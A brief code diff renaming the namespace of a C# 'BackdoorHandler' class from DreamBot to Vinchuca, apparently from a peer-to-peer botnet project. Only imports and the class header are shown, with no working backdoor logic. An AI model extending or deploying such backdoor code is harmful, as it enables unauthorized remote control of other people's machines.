@@ -1,10 +1,8 @@
-﻿using System;
-using DreamBot.Actions.Backdoor;
-using DreamBot.Network.Protocol.Messages;
-using DreamBot.Network.Protocol.Messages.Command;
-using DreamBot.Network.Protocol.Peers;
+﻿using Vinchuca.Actions.Backdoor;
+using Vinchuca.Network.Protocol.Messages;
+using Vinchuca.Network.Protocol.Messages.Command;
 
-namespace DreamBot.Network.Protocol.Handlers.Command
+namespace Vinchuca.Network.Protocol.Handlers.Command
 {
     class BackdoorHandler : IMessageHandler
     {
